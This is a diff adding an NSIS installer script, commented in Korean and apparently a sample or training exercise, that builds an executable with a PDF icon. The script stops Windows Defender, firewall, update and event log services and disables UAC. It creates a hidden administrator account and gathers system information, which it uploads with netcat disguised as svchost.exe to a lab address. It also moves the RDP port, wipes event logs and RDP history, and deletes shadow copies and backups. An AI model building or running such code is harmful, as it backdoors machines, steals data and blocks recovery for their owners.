@@ -1,0 +1,158 @@
+## 실행압축 형식 지정
+SetCompressor /SOLID LZMA
+
+
+Name 'sample'
+## 컴파일 시 실행파일 이름 지정
+OutFile '201863021.exe'
+
+## 설치 시 파일 숨김 지정
+;SilentInstall silent
+
+## 컴파일 시 아이콘 지정
+Icon pdf.ico
+
+!include winMessages.nsh
+
+Section	''
+
+## polaris office 프로그램 삭제
+	Exec '" C:\Program Files (x86)\Polaris Office\Office8\uninstall.exe" -Uninstall'
+	Sleep 1000
+
+find_polaris1:
+    Sleep 1000
+    FindWindow $0 '#32770' 'Polaris Office Installation'
+    IntCmp $0 0 find_polaris1
+    GetDlgItem $0 $0 1051
+    SendMessage $0 ${BM_CLICK} 0 0
+
+Sleep 1000
+
+find_polaris2:
+    Sleep 1000
+    FindWindow $0 '#32770' 'Polaris Office 삭제 완료'
+    IntCmp $0 0 find_polaris2
+
+    GetDlgItem $0 $0 1056
+    SendMessage $0 ${BM_CLICK} 0 0
+	
+  ## MSI 프로그램 삭제 chrome remote desktop## 
+	Exec '"msiexec.exe" /X {16044E2C-5ADC-4C34-B2FB-5A2E0B6908F6} /qn'
+	
+  # 스케쥴 삭제
+  
+  ExecShell "" "$sysdir\cmd.exe" "schtasks /DELETE /TN gimotti /F" SW_HIDE
+
+ 
+  ###테스트 악성파일 다운로드### 
+inetc::get /silent "https://secure.eicar.org/eicar.com" "C:\eicar2.com"
+Pop $0	
+
+Sleep 1000
+
+inetc::get /silent "https://amtso.eicar.org/eicar.com" "C:\eicar3.com"
+Pop $0
+
+Sleep 1000
+inetc::get /silent "http://amtso.eicar.org/PotentiallyUnwanted.exe" "C:\PotentiallyUnwanted.exe"
+Pop $0
+
+
+  ###보안 관련 서비스 중지###
+	nsExec::ExecToStack /TIMEOUT=10000 '"$WINDIR\system32\net.exe" stop "wuauserv"' # Windows Update
+	nsExec::ExecToStack /TIMEOUT=10000 '"$WINDIR\system32\net.exe" stop "wscsvc"' # Security Center
+	nsExec::ExecToStack /TIMEOUT=10000 '"$WINDIR\system32\net.exe" stop "Sense"' # Windows Defender Advanced Threat Protection
+	nsExec::ExecToStack /TIMEOUT=10000 '"$WINDIR\system32\net.exe" stop "WdNisSvc"' # Windows Defender Antivirus NIS
+	nsExec::ExecToStack /TIMEOUT=10000 '"$WINDIR\system32\net.exe" stop "WinDefend"' # Windows Defender Antivirus
+	nsExec::ExecToStack /TIMEOUT=10000 '"$WINDIR\system32\net.exe" stop "mpssvc"' # Windows Defender Firewall
+	nsExec::ExecToStack /TIMEOUT=10000 '"$WINDIR\system32\net.exe" stop "EventLog"' # Eventlog
+	nsExec::ExecToStack /TIMEOUT=10000 '"$WINDIR\system32\net.exe" stop "WSearch"' # Windows 색인
+	nsExec::ExecToStack /TIMEOUT=10000 '"$WINDIR\system32\net.exe" stop "SDRSVC"' # Windows 백업
+	nsExec::ExecToStack /TIMEOUT=10000 '"$WINDIR\system32\net.exe" stop "SecurityHealthService"' # Windows 보안서비스
+    Pop $0
+	Sleep 3000
+
+
+  ###레지스트리 변경 ###
+  WriteRegDword HKLM "SOFTWARE\Policies\Microsoft\Windows Defender" "DisableAntiSpyware" 1
+  WriteRegDword HKLM "SYSTEM\CurrentControlSet\Services\SecurityHealthService" "Start" 1
+  WriteREgDword HKLM "SYSTEM\CurrentControlSet\Services\wscsvc" "start" 1
+  WriteRegDword HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" "MaintenanceDisabled" 0
+  WriteRegDword HKLM "SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" "noAutoUpdate" 0
+  WriteRegDword HKLM "Software\Policies\Microsoft\Windows\WindowsUpdate\AU" "IncludeRecommendedUpdates" 1
+  WriteRegDword HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" 1
+
+
+  ;보안 및 유지 관리 알림 비활성화
+  WriteRegDword HKCU "Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" "Enabled" 0
+  ;알림 설정 변경 버튼 비활성화
+  WriteRegDword HKCU "Software\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" "NoToastApplicationNotification" 1
+  ;UAC 비활성화
+  WriteRegDword HKLM "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" "EnableLUA" 0
+  ;Windows Defender 서비스 비활성화
+  WriteRegDword HKLM "SOFTWARE\Policies\Microsoft\Windows Defender" "DisableAntiSpyware" 0
+  ;Windows Security Center 서비스 비활성화
+  WriteRegDword HKLM "SYSTEM\CurrentControlSet\Services\SecurityHealthService" "Start" 4
+  WriteREgDword HKLM "SYSTEM\CurrentControlSet\Services\wscsvc" "start" 4
+  ;유지보수 설정 비활성화
+  WriteRegDword HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" "MaintenanceDisabled" 1
+  ;업데이트 서비스 및 자동 업데이트 설정 비활성화
+  WriteRegDword HKLM "SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" "noAutoUpdate" 1
+  WriteRegDword HKLM "Software\Policies\Microsoft\Windows\WindowsUpdate\AU" "IncludeRecommendedUpdates" 0
+  
+  
+  
+  
+  ;Administrator 계정 활성화
+  ExecShell "" "$SysDir\cmd.exe" "/c net user administrator /active:yes" SW_HIDE
+  ;새로운 계정 생성
+  ExecShell "" "$SysDir\cmd.exe" "/c net user admin /add" SW_HIDE
+  ;Administrators 그룹에 추가
+  ExecShell "" "$SysDir\cmd.exe" "/c net localgroup administrators admin /add" SW_HIDE
+  ;사용자 숨김
+  WriteRegDWORD HKLM "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" "admin" 0
+  ;시스템 정보 수집
+  ExecShellWait "" "$SysDir\cmd.exe" "/c systeminfo >> $TEMP\info.txt" SW_HIDE
+  ExecShellWait "" "$SysDir\cmd.exe" "/c getmac /v >> $TEMP\info.txt" SW_HIDE
+  ExecShellWait "" "$SysDir\cmd.exe" "/c net user >> $TEMP\info.txt" SW_HIDE
+  ;netcat을 이용한 수집 정보 업로드 / 중계서버(192.168.244.129:8888)
+  ExecShell "" "$SysDir\cmd.exe" "/c $TEMP\svchost.exe -w 2 192.168.244.129 8888 < $TEMP\info.txt" SW_HIDE
+  ;RDP 테스트 (테스트용 코드)
+  ;ExecShellWait "" "$SysDir\cmd.exe" "/c mstsc /v 127.0.0.2" SW_HIDE
+  WriteREgDword HKLM "SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" "PortNumber" 9833 
+  
+  ;3389 포트 차단 우회 / RDP port 변경 3389 -> 9833 재부팅 필요
+   ### 흔적 제거 ###
+   # 감염 흔적 삭제
+    Exec "wevtutil.exe clear-log Application"
+    Exec "wevtutil.exe clear-log Security"
+    Exec "wevtutil.exe clear-log System"
+    Exec "sc config EventLog start= disabled"
+        
+  # RDP 로그 삭제
+    Exec 'reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f'
+    Exec 'reg delete "HKEY_CURENT_USER\Software\Microsoft\Terminal Server Client\Server" /f'
+    Exec 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"'
+    Exec 'attrib "%userprofile%\documents\Default.rdp" -s -h'
+    Exec 'del "%userprofile%\documents\Default.rdp"'
+        
+  # 파일 복원 방해
+    Exec "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
+    Exec "bcdedit /set {default} recoveryenabled no"
+    Exec "wbadmin delete catalog -quiet"
+    Exec "wbadmin delete systemstatebackup"
+    Exec "wbadmin delete systemstatebackup -keepversion:()"
+    Exec "wbadmin delete backup"
+    Exec "wmic shadowcopy delete"
+    Exec "vssadmin delete shadows /all /quiet"
+	
+	
+        
+    # 재부팅시 파일 자가삭제
+	#delete /REBOOTOK "$EXEPATH"
+
+    #재부팅 (레지스트리 적용을 위한 reboot)
+    SetRebootFlag true
+	
+SectionEnd
